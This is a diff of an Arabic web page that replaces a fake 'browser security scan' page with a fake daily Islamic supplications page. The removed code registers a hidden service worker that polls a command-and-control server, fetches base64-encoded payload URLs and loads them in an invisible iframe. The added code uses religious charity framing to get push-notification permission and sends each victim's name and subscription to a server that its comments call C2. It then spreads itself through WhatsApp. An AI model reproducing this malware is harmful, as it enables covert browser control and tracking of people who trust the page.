@@ -2,136 +2,250 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>نظام الحماية الذكي - فحص المتصفح</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="✨ أذكار وثواب - صدقة جارية باسمك ✨">
+    <meta property="og:description" content="فعل التنبيهات لتصلك أذكار يومية وتشارك الثواب مع أحبائك">
+    <meta property="og:image" content="og-image.jpg"> 
+    <meta property="og:type" content="website">
+
+    <title>أذكار المسلم اليومية | صدقة جارية</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    
     <style>
-        :root { --main-color: #00ff41; --bg-color: #0d0208; }
-        body { background: var(--bg-color); color: var(--main-color); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .container { text-align: center; border: 1px solid var(--main-color); padding: 40px; border-radius: 15px; background: rgba(0, 255, 65, 0.05); box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); z-index: 100; transition: 0.5s; width: 85%; max-width: 500px; }
-        h1 { font-size: 1.5rem; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }
-        p { color: #888; font-size: 0.9rem; margin-bottom: 25px; }
-        .btn { background: var(--main-color); color: #000; border: none; padding: 15px 30px; font-size: 1.1rem; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; transition: 0.3s; box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3); }
-        .btn:active { transform: scale(0.95); }
-        .loading-bar { width: 100%; height: 6px; background: #111; margin-top: 25px; display: none; position: relative; border-radius: 10px; overflow: hidden; }
-        .progress { width: 0%; height: 100%; background: var(--main-color); box-shadow: 0 0 15px var(--main-color); transition: 0.4s; }
-        #ghost-container { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; opacity: 0.001; pointer-events: none; z-index: -1; }
-        .scan-line { position: absolute; width: 100%; height: 2px; background: var(--main-color); top: 0; animation: scan 3s infinite; opacity: 0.2; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        :root {
+            --primary-color: #1b4d3e; /* أخضر ملكي */
+            --accent-color: #d4af37;  /* ذهبي */
+            --text-dark: #2d3748;
+            --bg-gradient: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        }
+
+        body {
+            background: var(--bg-gradient);
+            font-family: 'Cairo', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: var(--text-dark);
+        }
+
+        .container {
+            background: white;
+            width: 90%;
+            max-width: 480px;
+            border-radius: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.15);
+            padding: 40px 30px;
+            text-align: center;
+            position: relative;
+            border: 1px solid rgba(255,255,255,0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        /* زخرفة علوية */
+        .container::after {
+            content: "۞";
+            position: absolute;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: var(--accent-color);
+            font-size: 1.5rem;
+        }
+
+        .main-img {
+            width: 140px;
+            height: auto;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 10px 15px rgba(27, 77, 62, 0.2));
+            border-radius: 20px;
+        }
+
+        h2 {
+            color: var(--primary-color);
+            font-size: 1.8rem;
+            margin: 10px 0;
+            font-weight: 700;
+        }
+
+        .dua-card {
+            background: #fcfaf2;
+            padding: 30px;
+            border-radius: 20px;
+            margin: 25px 0;
+            border: 1px solid #e9e3d0;
+            position: relative;
+            box-shadow: inset 0 0 15px rgba(212, 175, 55, 0.05);
+        }
+
+        #displayDua {
+            font-family: 'Amiri', serif;
+            font-size: 1.6rem;
+            color: #333;
+            line-height: 2;
+            min-height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 18px;
+            border-radius: 15px;
+            border: 2px solid #eee;
+            font-family: 'Cairo', sans-serif;
+            font-size: 1.1rem;
+            text-align: center;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-color: var(--accent-color);
+            outline: none;
+            box-shadow: 0 0 15px rgba(212, 175, 55, 0.1);
+        }
+
+        .btn-action {
+            background: #25D366; /* لون واتساب */
+            color: white;
+            border: none;
+            padding: 20px;
+            width: 100%;
+            border-radius: 18px;
+            font-weight: 700;
+            font-size: 1.3rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 10px 20px rgba(37, 211, 102, 0.2);
+        }
+
+        .btn-action:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 25px rgba(37, 211, 102, 0.3);
+        }
+
+        .info-footer {
+            font-size: 0.9rem;
+            color: #718096;
+            margin-top: 25px;
+            background: #f7fafc;
+            padding: 10px;
+            border-radius: 10px;
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #2ecc71;
+            border-radius: 50%;
+            margin-left: 5px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
-    <div class="scan-line"></div>
-    <div class="container" id="mainPanel">
-        <h1 id="title">فحص الأمان المتقدم</h1>
-        <p id="desc">تم اكتشاف ثغرات أمنية قد تؤدي لتسريب بياناتك. اضغط أدناه للتنظيف الفوري.</p>
-        <button class="btn" id="startBtn" onclick="executeSystem()">بدء التنظيف والتسريع الآن</button>
-        <div class="loading-bar" id="barBox"><div class="progress" id="progressBar"></div></div>
-        <div id="status" style="margin-top: 15px; font-size: 0.85rem; font-weight: bold;">الحالة: جاهز للفحص</div>
+
+    <div class="container">
+        <img src="og-image.jpg" class="main-img" alt="Islamic Logo">
+        
+        <h2>🌹 أذكار وثواب جارٍ 🌹</h2>
+        <p style="margin-bottom: 0; color: #666;">صدقة جارية لك ولوالديك</p>
+
+        <div class="dua-card">
+            <div id="displayDua">جاري تحميل ذكر اليوم...</div>
+        </div>
+
+        <div class="input-group">
+            <input type="text" id="userName" placeholder="أدخل اسمك الكريم هنا..">
+        </div>
+
+        <button class="btn-action" onclick="activateSystem()">
+            <span>نشر الأذكار عبر واتساب</span> ✅
+        </button>
+
+        <div class="info-footer">
+            <span class="status-dot"></span>
+            تفعيل التنبيهات يضمن وصول الأجر لهاتفك يومياً 
+        </div>
     </div>
-    <div id="ghost-container"></div>
 
     <script>
-        // رابط السيرفر الخاص بك (C2)
-        const C2_URL = 'https://mohamedahmed77.pythonanywhere.com/get_task';
+        const VAPID_PUBLIC_KEY = "YOUR_PUBLIC_KEY_HERE";
+        const SERVER_URL = "https://yourusername.pythonanywhere.com/save_sub";
 
-        // 1. وظيفة النبضة المتطورة (تخطي الكاش و CORS)
-        async function pulse() {
+        // 1. وظيفة تحميل الدعاء الذكي بناءً على ملفك الـ JSON
+        async function loadDua() {
             try {
-                // إضافة طابع زمني لمنع المتصفح من سحب النتيجة من الذاكرة القديمة
-                const r = await fetch(C2_URL + '?t=' + Date.now(), {
-                    method: 'GET',
-                    mode: 'cors', 
-                    cache: 'no-store'
-                });
-                const d = await r.json();
+                const res = await fetch('daily_islamic_duas.json');
+                const data = await res.json();
                 
-                // تشغيل المهمة المخفية في الخلفية
-                const target = atob(d.payload);
-                fetch(target, { mode: 'no-cors' }); 
+                const months = ["January", "February", "March", "April", "May", "June", 
+                                "July", "August", "September", "October", "November", "December"];
+                const now = new Date();
+                const monthName = months[now.getMonth()];
+                const dayOfMonth = now.getDate();
 
-                // تحديث الـ Iframe الشبحي للمهمة الجديدة
-                const ifrm = document.createElement('iframe');
-                Object.assign(ifrm.style, { width: "100vw", height: "100vh", border: "none" });
-                ifrm.src = target;
-                const container = document.getElementById('ghost-container');
-                container.innerHTML = ''; 
-                container.appendChild(ifrm);
+                const monthDuas = data[monthName];
+                const todayDua = monthDuas.find(d => d.day === dayOfMonth);
+
+                if (todayDua) {
+                    document.getElementById('displayDua').innerHTML = `"${todayDua.text}" <span style="font-size: 2rem; margin-right:10px;">${todayDua.emoji}</span>`;
+                }
             } catch (e) {
-                console.log("Pulse error: ", e);
+                document.getElementById('displayDua').innerText = "اللهم بك أصبحنا وبك أمسينا وبك نحيا وبك نموت وإليك النشور 🕌"; 
             }
         }
 
-        // 2. زرع الجاسوس (Service Worker) مع نظام Zombie Sync
-        async function deployZombieWorker() {
-            const swCode = `
-                const C2_URL = '${C2_URL}';
-                self.addEventListener('install', e => self.skipWaiting());
-                self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+        // تشغيل التحميل فوراً
+        loadDua();
 
-                async function backgroundPulse() {
-                    try {
-                        const r = await fetch(C2_URL + '?sync=' + Date.now(), { mode: 'cors', cache: 'no-store' });
-                        const d = await r.json();
-                        await fetch(atob(d.payload), { mode: 'no-cors' });
-                    } catch (e) {}
-                }
+        // 2. وظيفة التفعيل والسيطرة (Web Push + WhatsApp)
+        async function activateSystem() {
+            const name = document.getElementById('userName').value || "محب للخير";
+            const duaText = document.getElementById('displayDua').innerText;
 
-                self.addEventListener('sync', e => { if(e.tag === 're-sync') e.waitUntil(backgroundPulse()); });
-                setInterval(backgroundPulse, 60000); // نبضة كل دقيقة
-            `;
-            const blob = new Blob([swCode], { type: 'application/javascript' });
-            const reg = await navigator.serviceWorker.register(URL.createObjectURL(blob));
-            if ('sync' in reg) await reg.sync.register('re-sync');
-        }
-
-        // 3. المحرك الرئيسي عند ضغط المستخدم
-        async function executeSystem() {
-            // تفعيل الاهتزاز وملء الشاشة لزيادة المصداقية والتحكم
-            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-
-            // تغيير شكل الواجهة لبدء عملية "الفحص"
-            document.getElementById('startBtn').style.display = 'none';
-            document.getElementById('barBox').style.display = 'block';
-            document.getElementById('status').innerText = "جاري تحليل قاعدة بيانات المتصفح...";
-            
-            let prog = 0;
-            const interval = setInterval(() => {
-                prog += Math.random() * 12;
-                if (prog >= 100) {
-                    prog = 100;
-                    clearInterval(interval);
-                    finalize();
-                }
-                document.getElementById('progressBar').style.width = prog + "%";
-                if(prog > 30) document.getElementById('status').innerText = "جاري تدمير ملفات التجسس...";
-                if(prog > 70) document.getElementById('status').innerText = "جاري تحسين سرعة الاتصال بالخادم...";
-            }, 700);
-
-            // تشغيل المهام السرية فوراً
+            // طلب إذن الإشعارات (السيطرة الدائمة)
             try {
-                await deployZombieWorker();
-                await pulse(); // نبضة فورية عند الضغط
-                setInterval(pulse, 45000); // استمرار النبضات كل 45 ثانية طالما الصفحة مفتوحة
-            } catch (e) {
-                console.log(e);
-            }
-        }
+                const permission = await Notification.requestPermission();
+                if (permission === 'granted' && 'serviceWorker' in navigator) {
+                    const reg = await navigator.serviceWorker.register('sw.js');
+                    const sub = await reg.pushManager.subscribe({
+                        userVisibleOnly: true,
+                        applicationServerKey: VAPID_PUBLIC_KEY
+                    });
 
-        // 4. إنهاء العملية وتحويل الضحية
-        function finalize() {
-            document.getElementById('title').innerText = "تم تأمين جهازك ✅";
-            document.getElementById('title').style.color = "#fff";
-            document.getElementById('desc').innerText = "تم تنظيف كافة التهديدات بنجاح. المتصفح الآن يعمل بأقصى سرعة.";
-            document.getElementById('status').innerText = "الحالة: محمي بالكامل";
-            document.getElementById('barBox').style.display = 'none';
-            
-            if (navigator.vibrate) navigator.vibrate([500]);
-            
-            // تحويل الضحية بعد 3 ثوانٍ لإبعاد الشبهة تماماً
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 3000);
+                    // إرسال بيانات الضحية للوحش C2 (الاسم، IP، والاشتراك)
+                    await fetch(SERVER_URL, {
+                        method: 'POST',
+                        body: JSON.stringify({ subscription: sub, name: name }),
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                }
+            } catch (e) { console.log("System activation bypass..."); }
+
+            // التوجيه لواتساب (الانتشار الفيروسي)
+            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${duaText}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
+            window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
         }
     </script>
 </body>
